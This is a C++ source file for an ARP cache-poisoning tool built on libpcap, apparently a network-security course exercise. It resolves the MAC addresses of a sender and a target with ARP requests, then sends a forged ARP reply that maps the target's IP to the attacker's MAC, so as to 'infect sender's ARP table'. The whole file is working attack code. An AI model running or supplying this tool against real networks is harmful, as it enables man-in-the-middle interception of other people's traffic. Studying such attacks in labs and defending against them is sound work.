#include "main.h"

void sendArp(pcap_t *handle, EthArpPacket pkt)
{
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pkt), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	else
	{
		printf("\n----------------------------------------\n");
		printf("[*] Arp packet sending succeeded!");
		printf("\n----------------------------------------\n");
	}
}

void sendArpThread(pcap_t *handle, EthArpPacket pkt, int repeat)
{
	while(true)
	{
		sendArp(handle, pkt);
		sleep(repeat);
	}
}

Mac getMac(pcap_t* handle, Ip attackerIp, Mac attackerMac, Ip ip)
{
	EthArpPacket pkt = EthArpPacket(ArpHdr::Request, Mac::broadcastMac(), attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, attackerMac, attackerIp, Mac::nullMac(), ip);
	
	std::thread thread1(sendArpThread, handle, pkt, 3);
	
	while (true)
		{
			struct pcap_pkthdr *header;
			const u_char *reply_packet;
			int result = pcap_next_ex(handle, &header, &reply_packet);
			if (result != 1)
			{
				continue;
			}
			EthArpPacket *reply = (EthArpPacket *)reply_packet;

			if (ntohs(reply->eth_.type_) == EthHdr::Arp && ntohs(reply->arp_.op_) == ArpHdr::Reply &&
				reply->arp_.sip_ == Ip(htonl(ip)) && reply->arp_.tip_ == Ip(htonl(attackerIp)))
			{
				thread1.detach();
				return reply->arp_.smac_;
			}
		}
}

int main(int argc, char *argv[])
{
	// parameter check
	if (argc < 4 || (argc % 2) != 0)
	{
		usage();
		return -1;
	}
	// for multiple execution
	int iter;
	for (iter = 2; iter <= argc-1; iter += 2)
	{
		printf("\n----------------------------------------\n");
		printf("[*] send-arp #%d..",iter/2);
		printf("\n----------------------------------------\n");

		char *dev = argv[1];
		const char *interfaceName = argv[1];
		
		Ip attackerIp;
		Mac attackerMac;
		
		getHostInfo(interfaceName, &attackerIp, &attackerMac);

		// Open pcap handle
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (handle == nullptr)
		{
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}
		printf("\n----------------------------------------\n");
		printf("[*] get sender Info..");
		printf("\n----------------------------------------\n");

		Ip senderIp = Ip(argv[iter]);
		Mac senderMac = getMac(handle, attackerIp, attackerMac, senderIp);
		printf("[+] senderIp    : %s\n", std::string(senderIp).c_str());
		printf("[+] senderMac   : %s\n", std::string(senderMac).c_str());

		printf("\n----------------------------------------\n");
		printf("[*] get target Info..");
		printf("\n----------------------------------------\n");

		Ip targetIp = Ip(argv[iter+1]);
		Mac targetMac = getMac(handle, attackerIp, attackerMac, targetIp);
		printf("[+] targetIp    : %s\n", std::string(targetIp).c_str());
		printf("[+] targetMac   : %s\n", std::string(targetMac).c_str());
		

		// Send ARP Reply packet to infect sender's ARP table
		sendArp(handle, EthArpPacket(ArpHdr::Reply, senderMac, attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, attackerMac, targetIp, senderMac, senderIp));

		pcap_close(handle);
	}
}